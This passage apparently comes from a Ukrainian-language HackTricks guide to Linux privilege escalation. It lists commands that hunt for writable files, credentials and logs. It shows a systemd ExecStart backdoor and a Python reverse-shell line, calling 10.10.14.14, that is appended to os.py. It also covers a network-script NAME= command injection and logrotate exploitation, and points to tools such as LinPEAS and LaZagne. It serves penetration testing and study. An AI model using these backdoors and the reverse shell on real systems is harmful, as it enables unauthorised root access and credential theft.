find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **modify the Tomcat service configuration file inside /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Незвичні місця/файли Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/Бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять passwords

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити passwords**.\
**Ще один цікавий інструмент**, який можна використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — програма з відкритим кодом для отримання великої кількості passwords, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший log, тим цікавіший він (ймовірно).\
Також деякі "**bad**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати passwords** всередині audit logs, як пояснено в цій статті: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи, група** [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Варто також перевіряти файли, що містять слово "**password**" у **назві** або всередині **вмісту**, а також шукати IPs і emails у logs, або hashes regexps.\
Я не буду тут описувати, як робити все це, але якщо вам цікаво, можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Записувані файли

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Щоб **backdoor the library**, просто додайте наприкінці бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Вразливість в `logrotate` дозволяє користувачам із **дозволом на запис** у файл журналу або його батьківські директорії потенційно отримати підвищені привілеї. Це трапляється тому, що `logrotate`, який часто запущений як **root**, можна змусити виконувати довільні файли, особливо в директоріях типу _**/etc/bash_completion.d/**_. Важливо перевіряти дозволи не лише в _/var/log_, але й у будь-яких директоріях, де застосовується ротація логів.

> [!TIP]
> Ця вразливість торкається `logrotate` версії `3.18.0` і старіших

Більше докладної інформації про вразливість доступно на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю вразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви знаходите можливість змінити логи, перевірте, хто керує цими логами, і чи можна ескалювати привілеї, підміняючи логи symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо, з якоїсь причини, користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий, то ваша **система pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих з’єднань. Вони виглядають точно як .INI файли. Однак вони ~sourced~ на Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється неправильно. Якщо в імені є **пробіл**, система намагається виконати частину після пробілу. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, and rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами в Linux**. Він включає скрипти для `start`, `stop`, `restart` і іноді `reload` сервісів. Ці скрипти можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язаний із Upstart — новішою системою управління сервісами, впровадженою в Ubuntu, яка використовує конфігураційні файли для керування сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit все ще використовуються разом із конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** є сучасною системою ініціалізації та керування сервісами, що надає розширені можливості, такі як запуск демонів за вимогою, керування автоматичним монтуванням і знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива і `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай підключають syscall, щоб відкрити привілейований функціонал ядра для userspace manager. Слабка аутентифікація manager-а (наприклад, перевірки підпису на основі FD-order або слабкі схеми паролів) може дозволити локальному app видаватися за manager-а і ескалювати до root на пристроях, які вже рутовані. Дізнайтеся більше та подробиці експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Пошук сервісів на основі regex у VMware Tools/Aria Operations може витягувати шлях до бінарника з командних рядків процесів і запускати його з параметром -v у привілейованому контексті. Допускні шаблони (наприклад, використання \S) можуть відповідати розміщеним атакуючим листенерам у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання як root (CWE-426 Untrusted Search Path).

Дізнайтеся більше й подивіться узагальнену схему, застосовну до інших стеків discovery/monitoring, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захисти ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Переліковує вразливості ядра в Linux і macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Підбірка додаткових скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
